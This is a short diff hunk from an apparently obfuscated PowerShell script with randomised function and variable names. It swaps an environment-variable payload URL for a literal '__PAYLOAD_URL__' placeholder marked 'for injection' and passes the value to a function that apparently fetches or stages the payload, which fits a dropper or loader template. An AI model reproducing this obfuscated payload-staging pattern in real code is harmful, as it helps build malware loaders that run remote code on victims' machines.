@@ -25,7 +25,7 @@ function XoRpQkZtLs {
     }
 }
 
-$QwErTyUuOo = $env:PAYLOAD_URL  
+$QwErTyUuOo = "__PAYLOAD_URL__"  # Placeholder for injection
 
 $VvWwXxYyZz = XhYjVwJtKz -AaBbCcDdEe $QwErTyUuOo
 
